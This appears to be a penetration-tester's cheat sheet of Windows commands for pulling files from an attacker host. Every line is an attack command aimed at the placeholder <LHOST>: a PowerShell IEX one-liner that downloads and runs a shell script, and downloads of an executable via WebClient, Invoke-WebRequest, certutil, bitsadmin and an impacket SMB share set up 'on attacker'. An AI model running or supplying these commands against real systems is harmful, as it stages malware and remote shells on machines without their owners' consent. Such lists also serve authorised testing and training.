```
# PowerShell:
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')
(New-Object Net.WebClient).DownloadFile('http://<LHOST>/file.exe','C:\Temp\file.exe')
Invoke-WebRequest -Uri http://<LHOST>/file.exe -OutFile C:\Temp\file.exe

# Certutil:
certutil -urlcache -split -f http://<LHOST>/file.exe C:\Temp\file.exe

# BITS:
bitsadmin /transfer job /download /priority normal http://<LHOST>/file.exe C:\Temp\file.exe

# SMB (setup on attacker):
impacket-smbserver share . -smb2support
copy \\<LHOST>\share\file.exe C:\Temp\
```